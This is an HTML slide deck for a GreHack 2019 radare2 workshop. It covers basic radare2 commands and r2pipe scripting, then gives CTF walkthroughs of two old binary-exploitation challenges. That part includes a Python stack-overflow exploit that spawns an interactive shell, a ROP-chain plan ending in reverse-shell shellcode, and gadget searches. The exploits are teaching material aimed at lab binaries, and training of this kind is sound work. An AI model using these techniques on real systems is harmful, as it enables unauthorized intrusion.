<!DOCTYPE html>
<html>
  <head>
    <title>Radare2</title>
    <meta charset="utf-8">
    <style>
        @import url(https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,500,500i,700,700i);
        @import url(https://cdn.rawgit.com/tonsky/FiraCode/1.204/distr/fira_code.css);

        body {
          font-family: 'Fira Sans','Droid Serif', 'Palatino Linotype', 'Book Antiqua', Palatino, 'Microsoft YaHei', 'Songti SC', serif;
        }

        .remark-code, .remark-inline-code {
          font-family: 'Fira Code', 'Lucida Console', Monaco, monospace;
          font-size: 80%;
        }

        .remark-slide-content {
            background-color: #FAFAFA;
            border-top: 80px solid #23373B;
            font-size: 25px;
            font-weight: 300;
            line-height: 1.5;
            padding: 1em 2em 1em 2em
          }
          .title-slide .inverse .remark-slide-content {
            background-color: #FAFAFA;
          }
          .inverse {
            background-color: #23373B;
            text-shadow: none;
          }
          .remark-slide-content > h1 {
            font-family: 'Fira Sans';
            font-weight: normal;
            font-size: 45px;
            margin-top: -95px;
            margin-left: -00px;
            color: #FAFAFA;
						position: absolute;
						top: 95px;
          }
          .remark-slide-content > inverse {
          width: 112px;
          height: 47px;
          border-bottom: 1px solid black;
          position: absolute;
          }
          /* Removes colored bar from top of the slide resulting in a clear slide */
          .clear{
            border-top: 0px solid #FAFAFA;
          }
          .remark-slide-content > h2, h3, h4 {
            padding-top: -15px;
            padding-bottom: 00px;
            color: #1A292C;
            text-shadow: none;
            font-weight: 400;
            text-align: left;
            margin-left: 00px;
            margin-bottom: -10px;
          }
          .remark-slide-content > h2, .pull-left > h2, .pull-right > h2 {
            font-size: 35px;
          }
          .remark-slide-content > h3, .remark-slide-content > h4,
          .pull-left > h3, .pull-left > h4, .pull-right > h3, .pull-right > h4 {
            font-size: 30px;
          }
          .title-slide {
            background-color: #FAFAFA;
            border-top: 80px solid #FAFAFA;
          }
          .title-slide > h1  {
            color: #1A292C;
            font-size: 40px;
            text-shadow: none;
            font-weight: 400;
            text-align: left;
            margin-left: 15px;
            padding-top: 80px;
						position: absolute;
          }
          .title-slide > h2  {
            margin-top: -25px;
            padding-bottom: -20px;
            color: #1A292C;
            text-shadow: none;
            font-weight: 300;
            font-size: 35px;
            text-align: left;
            margin-left: 15px;
          }
          .title-slide > h3  {
            color: #1A292C;
            text-shadow: none;
            font-weight: 300;
            font-size: 25px;
            text-align: left;
            margin-left: 15px;
            margin-bottom: -30px;
          }
          .remark-slide-number {
            font-size: 13pt;
            font-family: 'Fira Sans';
            color: #272822;
            opacity: 1;
          }
          .inverse .remark-slide-number {
            font-size: 13pt;
            font-family: 'Fira Sans';
            color: #FAFAFA;
            opacity: 1;
          }
          /* turns off slide numbers for title page: https://github.com/gnab/remark/issues/298 */
          .title-slide .remark-slide-number {
            display: none;
          }
          .remark-inline-code {
            /* background: #F5F5F5; /* lighter */
            background: #e7e8e2; /* darker */
            border-radius: 3px;
            padding: 4px;
          }
          .code10 .remark-code {
            font-size: 10%;
          }
          .code20 .remark-code {
            font-size: 20%;
          }
          .code30 .remark-code {
            font-size: 30%;
          }
          .code40 .remark-code {
            font-size: 40%;
          }
          .code50 .remark-code {
            font-size: 50%;
          }
          .code60 .remark-code {
            font-size: 60%;
          }
          .code70 .remark-code {
            font-size: 70%;
          }
          .code80 .remark-code {
            font-size: 80%;
          }
          .code90 .remark-code {
            font-size: 90%;
          }
          .code100 .remark-code {
            font-size: 100%;
          }
          .font10 {
            font-size: 10%;
          }
          .font20 {
            font-size: 20%;
          }
          .font30 {
            font-size: 30%;
          }
          .font40 {
            font-size: 40%;
          }
          .font50 {
            font-size: 50%;
          }
          .font60 {
            font-size: 60%;
          }
          .font70 {
            font-size: 70%;
          }
          .font80 {
            font-size: 80%;
          }
          .font90 {
            font-size: 90%;
          }
          .font100 {
            font-size: 100%;
          }
          .font110 {
            font-size: 110%;
          }
          .font120 {
            font-size: 120%;
          }
          .font130 {
            font-size: 130%;
          }
          .font140 {
            font-size: 140%;
          }
          .font150 {
            font-size: 150%;
          }
          .font160 {
            font-size: 160%;
          }
          .font170 {
            font-size: 170%;
          }
          .font180 {
            font-size: 180%;
          }
          .font190 {
            font-size: 190%;
          }
          .font200 {
            font-size: 200%;
          }
    </style>
  </head>
  <body>
    <textarea id="source">
class: middle, top

# Workshop Radare2

<img src="./r2.png"  height="100" style="margin:auto;">

## Grehack 2019 — `radare2` workshop

---
class: middle, left

# Radare2 workshop!

- No money to buy IDA?<br>
- No java to run Ghidra?<br>
- No time to write Binary Ninja plugins to make it somewhat useful?<br>
- No Mac to run Hopper?<br>
- No Windows to run WinDBG?<br>
- Failed to get a seat at the [miasm](https://grehack.fr/2019/workshops#miasm) workshop?<br>

Welcome to radare2!

---
class: middle, left

# Agenda

1. What is this radare2 thing?
1. How do I radare2?
2. How do I impress my CTF pals with it?
3. How can I get r2 swag?
4. How do I automate things in radare2?

---
class: middle, left

# Who are we?

### Julien (jvoisin) Voisin
- dustri.org

### Simon (smagnin) Magnin
- smagnin.org


---

# What is this radare2 thing?

```
[0x00004730]> ?E It's like vim in Dwarf Fortress, right?
 ╭──╮    ╭─────────────────────────────────────────╮
 │ _│    │                                         │
 │ O O  <  It's like vim in Dwarf Fortress, right? │
 │  │╭   │                                         │
 ││ ││   ╰─────────────────────────────────────────╯
 │└─┘│
 ╰───╯
[0x00004730]>
```

---
class: middle, left

# What is radare2?

- Reverse engineering *framework*
- Open-sauce
- Extensible
- Command-line
- ~700 contributors, 23k commits, 11 years old

---
class: middle, left

# Installing radare2

- `git clone https://github.com/radare/radare2`
- `cd radare2`
- `git checkout last-version`
- `./sys/install.sh`

---

# How do I radare2?

```
[0x00004730]> ?E What do you mean, "command line"?!
 ╭──╮    ╭────────────────────────────────────╮
 │ _│    │                                    │
 │ O O  <  What do you mean, "command line"?! │
 │  │╭   │                                    │
 ││ ││   ╰────────────────────────────────────╯
 │└─┘│
 ╰───╯
[0x00004730]>
```

---
class: middle, left

# Commands

- Every character has a purpose/meaning
	- `p` → `p`rint
	- `d` → `d`isassemble
- Combine them to form commands
	- `pd` → `print` + `disassemble`
- Everything is documented with `?`
	- `pd?`
	- recursive help via `?*`
- Open a binary with `radare2 /your/binary`


---
class: middle, left

# Commands (ex.)

- How do you print a hexdump?
- How do you analyze and opcode?
- How do I get the import information?

---
class: middle, left

# Commands (ex.)

- How do you print a hexdump → `px`
- How do you analyze and opcode → `ao`
- How do I get the import information → `ii`


- Remember about `?*|grep`

---
class: middle, left

# The information command `i`

- What is the file format / architecture / word size of a binary?

- What are the strings present in a binary?

---
class: middle, left

# The information command `i`

- What is the file format / architecture / word size of a binary → `iI`

- What are the strings present in a binary → `izz`

---
class: middle, left

# Open command

- `r2` open the binary and use binary information
- `r2 -n` do not use the binary information
- `r2 -w` write mode
- `oo`, `oon`, `oow` reopen in a given mode

---
class: middle, left

# Print command

- `pB` print bits
- `px` `pxe` `p8` print hexadecimal
- `p=` visualization mode

---
class: middle, left

# Seek command

- `s 0xXXXX` seek to offset
- `s` show current function
- `s-` seekback to previous offset
- `@` temporary seek

---
class: middle, left

# ! redirections

- `!ls` vs `ls` external/internal ls
- `~` vs `| grep`

---
class: middle, left

# Pratice

- Print the md5 of the `crackme0x01` file
- Print the first `0x50` bytes of the binary in hex
- What is the physical address of the `main` function?

---
class: middle, left

# Pratice

- Print the md5 of the `crackme0x01` file → `oon` then `ph $s @ 0`
- Print the first `0x50` bytes of the binary in hex→ `px 0x50 @ 0`
- What is the physical address of the `main` function → `?p @ main`

---
class: middle, left

# modes

You can append the following to every command:

- `j` json
- `q` quiet
- `qq` very quiet
- `*` r2 command

---
class: middle, left

# Search command

- `/`  search strings
- `/x` - search hexadecimal
- `/ac` - search opcodes
- `/R` - search Rop Gadgets

---
class: middle, left

# Analyze command

- `af`/`aa…` - Analyse function / Auto-analaysis
- `afl`/`afi`/`Vv` - function information
- `pdf`/`pdr` - print disassembly function (linear/recursive)
- `afv` - manipulate arguments and variables
- `agf` - graph

---
class: middle, left

# Analyze exercise

- Analyze all functions with the default auto-analysis
- List functions by name, anything interesting?
	- Can you rename some functions to something more meaningful
- How many local variables does `0x0804842b` have?
- Analyze the first opcode at `0x0804842b`
- Use `ahi` to convert the immediate to decimal

---
class: middle, left

# Analyze exercise

- Analyze all functions with the default auto-analysis → `aaa`
- List functions by name, anything interesting?
	- Can you rename some functions to something more meaningful → `afl`
- How many local variables does `0x0804842b` have? → `afv @ 0x0804842b`
- Analyze the first opcode at `0x0804842` → `ao @ 0x0804842b`
- Use `ahi` to convert the immediate to decimal → `ahi d @ 0x0804842b`

---
class: middle, left

# Pipes and redirections

- `pd 1; ao 1`
- `ao | grep name`
- `ao > test.txt`
- `ao >> test.txt`

---
class: middle, left

# Define Macros

- define it : `(foobar, pd1, ao)`
- use it : `.(foobar)`
- don't remember your macro ? `(*`
- remove it : `(-foobar)`
- with arguments: `(foobar arg1, pd $0)`

---
class: middle, left

# R2script is too horrible? Just use r2pipe!

- r2script is awful, bindings sucks, … all hail r2pipe!
- It works with your favourite language: NodeJS, Python, Java, Ruby, Prolog, OCaml, Haskell, Javascript, Rust, C, …

---
class: middle, left

# Install r2pipe

- `npm install r2pipe`
- `pip install r2pipe`
- …

---
class: middle, left

# r2pipe use

```python
import r2pipe

r2 = r2pipe.open('./crackme0x01')
r2.cmd('aa')
print(r2.cmd('pdf'))
r2.cmd('s main')
print(r2.cmdj('pdfj'))
```

---
class: middle, left
# Script exercise

Print a tree of all functions, using r2pipe!

```python
import r2pipe

r2 = r2pipe.open('./crackme0x01')
r2.cmd('aa')
print(r2.cmd('pdf'))
r2.cmd('s main')
print(r2.cmdj('pdfj'))
```


---
class: middle, left
# Script exercise (solution)

```python
r2 = r2pipe.open(sys.argv[1])
r2.cmd("aa")
def dump_fun(name, depth=0):
    print('\t'*depth + name)
    r2.cmd('s %s' % name)
    r2.cmd('af %s' % name)
    for line in r2.cmdj('pdfj @%s' % name)['ops']:
        if line['type'] != 'call':
            continue
        nxt = line['disasm'].split(' ')[1]  # ugh
        if 'sym.imp.' in nxt or nxt == name:
            continue
        try:
            dump_fun(nxt, depth+1)
        except:
            continue

dump_fun('main')

```

---

# So far so good?

```
[0x00004730]> ?E Questions?
 ╭──╮    ╭────────────╮
 │ _│_   │            │
 │ O O  <  Questions? │
 │  │╷   │            │
 │  ││   ╰────────────╯
 │ ─╯│
 ╰───╯
[0x00004730]>
```

---


# How do I impress my CTF 🏴 pals with it?

### Excellent, we can attack in any direction!

---
class: middle, left

# Pop Quizz

♪ Put your hands in the air if you know about ♫

- Exploitation
- Buffer overflows
- ROP chains
- Mitigations
- CTF


---
class: middle, left

# Sushi — BSides Vancouver CTF 2015

![logo bsides vc](./bsides-vancouver.png)

- Cool CTF, organised by nice people
- Super-easy challenge

---
class: middle, left

# Recon and mitigations

```nasm
$ r2 ./sushi-a6cbcb6...98cb4f98c8
[0x004004a0]> i~canary
[0x004004a0]> i~format
[0x004004a0]> i~nx
[0x004004a0]> i~pic
[0x004004a0]> i~relro
```

---
class: middle, left

# How to run the binary?

Use rarun:

```
$ rarun2 program=./sushi-a6cbc...4f98c8 listen=4444
$ rarun2 -h
```

---
class: middle, left

# Reversing (ex.)

```nasm
[0x004004a0]> aa
[0x004004a0]> pdf
[0x004004a0]> s main
[0x004004a0]> pdf
```

What is the main function doing?

---
class: middle, left

# Reversing (ex.)

```nasm
[0x004004a0]> aa
[0x004004a0]> pdf
[0x004004a0]> s main
[0x004004a0]> pdf
```

What is the main function doing?

```c
int main(int argc, char** argv) {
  char local_40[0x40];
  printf(“Deposit money for sushi here:     %p\n”, local_40);
  fflush(stdout);
  gets(local_40):
  printf(“Sorry, $0.%d is not enough.\n”, local_40);
  fflush(stdout);
  return 0
}

```

---
class: middle, left

# Getting RIP control (ex.)

```nasm
$ ragg2 -P 128 -r
$ r2 -d ./sushi-a6cbc...8cb4f98c8
[0x7fd1f7ebc090]> dc
[0x004005f2]> dr=
[0x004005f2]> pd 1 @ rip
[0x004005f2]> pxW 4 @ rsp
[0x004005f2]> wopO `pxW 4 @ rsp~[1]`
```
---
class: middle, left

# Getting RIP control (ex.)

```nasm
$ ragg2 -P 128 -r
$ r2 -d ./sushi-a6cbc...8cb4f98c8
[0x7fd1f7ebc090]> dc
[0x004005f2]> dr=
[0x004005f2]> pd 1 @ rip
[0x004005f2]> pxW 4 @ rsp
[0x004005f2]> wopO `pxW 4 @ rsp~[1]`
```

72 chars until RIP control

---
class: middle, left

# Writing an exploit (ex.)

Our payload will look like this:

```python
shellcode | ‘A’* (72 - len(shellcode)) | buffer_addr
```
```python
$ ragg2 -z -i exec
```

Can you build a working exploit?

---
class: middle, left

# Exploit

```python
import socket, struct, re

def rop(*args):  # 'Q' and not 'I' for x64
    return struct.pack('Q'*len(args), *args)

shellcode = "\x31...\x05"
s = socket.create_connection(('127.0.0.1', 4444))
buffer_addr = re.search('^Deposit money for sushi   here: (.+)$',
    s.recv(1024)).group(1)
buffer_addr = int(buffer_addr, 16)

s.send(shellcode + 'A'*(72 - len(shellcode)) +
    rop(buffer_addr) + '\n')
s.recv(1024)

while(True):
    s.send(raw_input('$ ') + '\n')
    print(s.recv(1024))
```

---
class: middle, left

# CSAW Quals 2013 - Diary (exp300)

![logo csaw](./csaw.png)

- CSAW quals 2013
- easy CTF challenge

---
class: middle, left

# Mitigations (ex.)

- PIE?
- RELRO?
- NX?
- Canary?
- ASLR?

---
class: middle, left

# Mitigations (ex.)

- PIE → Nope
- RELRO → Nope
- NX → Nope
- Canary → Nope
- ASLR → Yup

---
class: middle, left

# What is the binary doing? (ex.)

- Hint1: some networking stuff
- Hint2: on what port does it listen?

---
class: middle, left

# Find the username/password (ex.)

---
class: middle, left

# Find the username/password (ex.)

```nasm
[0x080488c0]> izz~rodata:30..-5
98  0x00001a28 0x08049a28 38  39   .rodata   ascii   Welcome!\nhttp://youtu.be/KmtzQCSh6xk\n\n
99  0x00001a4f 0x08049a4f 8   9    .rodata   ascii   csaw2013
100 0x00001a58 0x08049a58 9   10   .rodata   ascii   S1mplePWD
117 0x000020c0 0x0000008e 7   8    .shstrtab ascii   .rodata
[0x080488c0]>
```

- login: `csaw2013`
- passwd: `S1mplePWD`

---
class: middle, left

# What is the binary doing? (ex.)

- Hint1: What is the binary reading?
- Hint2: What is it doing with the binary?

---
class: middle, left

# What is the binary doing?

```C
void read_data(int fd, int size) {
 if ( size + 1 <= 0x400 ) {
  char buf[0x41C];
  int nbread = recv(fd, &buf, size, 0);
  nbread = nbread > 0x400 ? 1024; nbread;
  if (!check_nonnull(&buf, nbread)) {
   fprintf(stderr, "%s\n", "This entry had Non-ASCII characters.. […]");
  } else {
   char fb[0x80] = {0};
   snprintf(&fb, 0x7F, "diary%llu.txt", global_cpt);
   FILE* stream = fopen(&fb, "w");
   if ( stream ) {
    if ( nbread == fwrite(&buf, 1u, nbread, stream))
     fflush(stream)
    fclose_and_remove(stream, &fb);
   }
  }
 }
}
````

---
class: middle, left

# What is the binary doing?

TL;DR

1. Asking for a `size` in `fcn.08048e52`
1. Checks that `size+1` isn't superior to `0x400` in `fcn.08048efe`
1. Read `size` chars
1. Write the chars to a file
1. Delete the file

---
class: middle, left

# Find the vulnerability (ex.)

- Hint1: What could the vulnerability type be?
- Hint2: `atoi`


---
class: middle, left

# Find the vulnerability (ex.)

- `size` is passed to `atoi`, returning an `int`
- `if size + 1 > 0x400` → integer overflow!
- resulting in a linear stack-based buffer-overflow

---
class: middle, left

# Getting eip control (ex.)

```nasm
$ ragg2 -P 128 -r
$ r2 -d ./fil_chal
[0x7fd1f7ebc090]> dc
[0x004005f2]> dr=
[0x004005f2]> pd 1 @ rip
[0x004005f2]> pxW 4 @ rsp
[0x004005f2]> wopO `pxW 4 @ rsp~[1]`
```

1056 bytes before overwriting EIP

---
class: middle, left

# Designing our ROP chain

1. Since the binary isn't PIE, we can gather some gadgets
1. Leak libc address of read(1) and return to the vulnerable function
2. Compute the offset of system(2)
3. Read our command, and write it somewhere
4. Call system(3) on it
5. Send our command

But…

---
class: middle, left

# Designing our ROP chain

1. Since the binary isn't PIE, we can gather some gadgets
1. Leak libc address of read(1) and return to the vulnerable function
2. Compute the offset of system(2)
3. Read our command, and write it somewhere
4. Call system(3) on it
5. Send our command

But y'all have different libc, and I'm lazy.


---
class: middle, left

# Plot twist

1. Stack is executable
2. But no `jmp` esp gadget in the binary
3. Write `jmp esp` somewhere in the `.data` segment
4. Return to it
5. Send our reverse-shell shellcode

---
class: middle, left

# Finding a writteable place (ex.)

```nasm
$ r2 -d ./Dairy/fil_chal
[0xf7fc60b0]> db main
[0xf7fc60b0]> dc
hit breakpoint at: 8048974
[0x08048974]> iS~w
18  0x00001e88    0x8 0x0804ae88    0x8 -rw- .ctors
19  0x00001e90    0x8 0x0804ae90    0x8 -rw- .dtors
20  0x00001e98    0x4 0x0804ae98    0x4 -rw- .jcr
21  0x00001e9c   0xd8 0x0804ae9c   0xd8 -rw- .dynamic
22  0x00001f74   0x8c 0x0804af74   0x8c -rw- .got
23  0x00002000    0x8 0x0804b000    0x8 -rw- .data
24  0x00002008    0x0 0x0804b008   0x18 -rw- .bss
[0x08048974]>
```

---
class: middle, left

# Finding a `pop;pop;pop;ret` gadget (ex.)

- *Searching* (like you would do in vim) for `R`op gadgets.
- We want `rop` gadgets with a `len`gth of 4 instructions

---
class: middle, left

# Finding a `pop;pop;pop;ret` gadget

```nasm
[0x080488c0]> e rop.len = 4
[0x080488c0]> "/Rq pop;pop;pop"
0x08049110: pop ebx; pop edi; pop ebp; ret;
0x080494cf: pop esi; pop edi; pop ebp; ret;
0x0804956d: pop esi; pop edi; pop ebp; ret;
[0x080488c0]>
```

---
class: middle, left

# Exploit

```python
huge_number
padding*0x420
read
pop;pop;pop;ret
4 (socket fd)
writeable addr
2 (size of jmp esp gadget)
writeable addr
```

---
class: middle, left

# How can I get r2 swag?

```
[0x00004730]> ?E How much did you say for the radare2 plumbus?
 ╭──╮    ╭───────────────────────────────────────────────╮
 │ _│    │                                               │
 │ O O  <  How much did you say for the radare2 plumbus? │
 │  │╭   │                                               │
 ││ ││   ╰───────────────────────────────────────────────╯
 │└─┘│
 ╰───╯
[0x00004730]>
```

---
class: middle, left

# The same crackme, twice

Two crackmes:

- One is in SPARC\_64
- One is in x86\_64, but __heavily packed__

Your choice ;)

We'll trade an _amazing_ r2flag for a short presentation of your solution :)

---
class: middle, left

# Documentations and friendly neighbours


- The [r2book](https://radare.gitbooks.io/radare2book/content)
- [IRC](irc://irc.freenode.net/radare)/[Telegram](https://telegram.me/joinchat/ACR-FkEK2owJSzMUYjt_NQ)/…
- The [r2con]( https://www.radare.org/con/ )

---
class: middle, left

# Cheers

- Xarkes for inviting us!
- All the r2 contributors
- You all, for attenting our workshop ♥

```
[0x00004730]> ?E Now go score some flags at the CTF!
 ╭──╮    ╭─────────────────────────────────────╮
 │ _│_   │                                     │
 │ O O  <  Now go score some flags at the CTF! │
 │  │╷   │                                     │
 │  ││   ╰─────────────────────────────────────╯
 │ ─╯│
 ╰───╯
[0x00004730]>
```

   </textarea>
    <script src="./remark-latest.min.js"></script>
    <script>
      var slideshow = remark.create({highlightLines: true});
    </script>
  </body>
</html>
